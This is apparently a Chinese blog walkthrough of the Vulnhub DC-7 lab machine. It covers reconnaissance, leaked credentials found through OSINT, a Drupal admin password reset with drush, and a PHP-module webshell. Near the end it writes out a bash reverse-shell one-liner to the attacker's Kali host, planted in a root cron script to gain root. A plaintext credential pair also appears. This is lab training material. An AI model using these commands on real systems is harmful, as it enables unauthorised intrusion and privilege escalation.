---
title: 'DC-7 : Walkthrough'
date: 2020-05-20T12:38:33+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机       | IP              |
| --------- | --------------- |
| 本机（Win10） | `192.168.1.105` |
| Kali      | `192.168.1.112` |
| DC-7      | `192.168.1.103` |

### 扫描端口和版本信息

`nmap -A 192.168.1.103`

![1.png](https://i.loli.net/2020/05/19/f3qDtLavP7eZYH8.png) 

### 访问 Web 并确定 Web 应用

根据 Nmap 扫描结果可知，Web 应用程序运行的是 **Drupal 8** CMS

![2.png](https://i.loli.net/2020/05/19/r93yAugMnNGq1jW.png) 

经过 OSINT 搜索得知该版本存在 **RCE** 漏洞，但是测试时并不能成功（现在看来原因是不支持 PHP）。此外作者提示我们不要用暴力破解和字典攻击，而是思考该虚拟机之外的东西，说的明白点，就是进行外网信息收集

> 谁知道我发现 `@DC7USER` 这串字符的重要性花了多久，╯︿╰ 

<pre><code class="line-numbers">If you need to resort to brute forcing or dictionary attacks, you probably won't succeed.

What you will need to do, is to think "outside" of the box.
</code></pre>

![3.png](https://i.loli.net/2020/05/19/gc8FVSTiX3xpYuz.png) 

在该项目的 _config.php_ 文件中存在一个用户名和密码：`dc7use:MdR3xOgB7#dW`。于是使用该账户进行 ssh 登录后，发现 _mbox_ 文本文件

![4.png](https://i.loli.net/2020/05/19/rvIJqBoK5zXD3Gh.png) 

根据文本信息，我们知道 root 账户的 `cron` 定时任务会定时运行 `/opt/scripts/backups.sh` 脚本

![5.png](https://i.loli.net/2020/05/19/6tHn8WZPv17Ns4b.png) 

不过通过查看该文本权限知道当前用户不具备写能力，并且该文件的用户组是 _www-data_，因此我们下一步就是切换到 _www-data_ 用户组里的用户，然后修改该脚本，这样 root 账户下的定时任务就会执行该脚本

由于系统不存在 `adduser` 工具导致新建账户的方法不可行，那么就只有修改 _www-data_ 账户的密码，因此使用系统中的 `drush`这一工具修改密码（查看环境变量）

`drush user-password admin --password="isdof123"`

![6.png](https://i.loli.net/2020/05/19/iRGCBWy7wZ4pbIk.png) 

使用 _admin_ 账户密码登录 Drupal 后台。尝试过上传图片马，不过发现不支持 PHP，那么接下来我们可以安装 [PHP 模块](https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz)

![7.png](https://i.loli.net/2020/05/19/YCeDmOAln7HGoM2.png) 

![8.png](https://i.loli.net/2020/05/19/E5OIiPgjtnSNH7d.png) 

![9.png](https://i.loli.net/2020/05/19/7NuUpE9Zgtly3b4.png) 

### Getshell

既然已经安装好PHP模块，并且启用了该模块，那么我们就可以新建 php 文件，而不必上传图片马

![10.png](https://i.loli.net/2020/05/19/7D2UQhgd6W3tmxA.png) 

同时在 Kali 上监听 **7788** 端口，于是我们就可以拿到 _www-data_ 的 shell

![11.png](https://i.loli.net/2020/05/19/SgCRd9NEUXwKmqA.png) 

### 提权

之后执行命令修改 _backups.sh_ 脚本

`echo "bash -c 'bash -i >& /dev/tcp/192.168.1.112/7788 0>&1' " > /opt/scripts/backups.sh`

等待一段时间就可以取得 root 权限

![12.png](https://i.loli.net/2020/05/19/udAMemOJFE4jKqC.png)